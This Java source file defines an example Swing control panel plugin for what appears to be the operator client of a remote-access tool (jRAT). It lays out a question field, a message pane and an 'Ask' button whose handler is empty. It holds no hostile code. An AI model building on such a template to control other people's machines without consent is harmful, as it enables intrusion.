package pro.jrat.client.ui;

import java.util.HashMap;
import java.util.Map;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.JLabel;

import pro.jrat.api.BaseControlPanel;
import pro.jrat.api.RATObject;
import javax.swing.JTextField;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.JScrollPane;
import javax.swing.ScrollPaneConstants;
import javax.swing.JTextPane;
import javax.swing.JButton;
import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;

@SuppressWarnings("serial")
public class ExampleControlPanel extends BaseControlPanel {

	public static final Map<RATObject, ExampleControlPanel> INSTANCES = new HashMap<RATObject, ExampleControlPanel>();
	private JTextField txtQuestion;
	private JTextPane txtMessage;
	
	public ExampleControlPanel() {
		INSTANCES.put(super.getServer(), this);
		
		JLabel lblSendQuestion = new JLabel("Send question:");
		
		txtQuestion = new JTextField();
		txtQuestion.setText("Question");
		txtQuestion.setColumns(10);
		
		JLabel lblMessage = new JLabel("Message:");
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		
		JButton btnAsk = new JButton("Ask");
		btnAsk.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				ask();
			}
		});
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.TRAILING)
						.addComponent(lblMessage)
						.addComponent(lblSendQuestion))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(btnAsk, Alignment.TRAILING, GroupLayout.DEFAULT_SIZE, 354, Short.MAX_VALUE)
						.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 354, Short.MAX_VALUE)
						.addComponent(txtQuestion, GroupLayout.DEFAULT_SIZE, 354, Short.MAX_VALUE))
					.addContainerGap())
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addContainerGap()
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(lblSendQuestion)
						.addComponent(txtQuestion, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(lblMessage)
						.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 220, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addComponent(btnAsk)
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
		);
		
		txtMessage = new JTextPane();
		txtMessage.setText("Do you know this is the example plugin?");
		scrollPane.setViewportView(txtMessage);
		setLayout(groupLayout);

	}
	
	public void ask() {
		
	}

	@Override
	public void onClose() {
		INSTANCES.remove(super.getServer());
	}
}
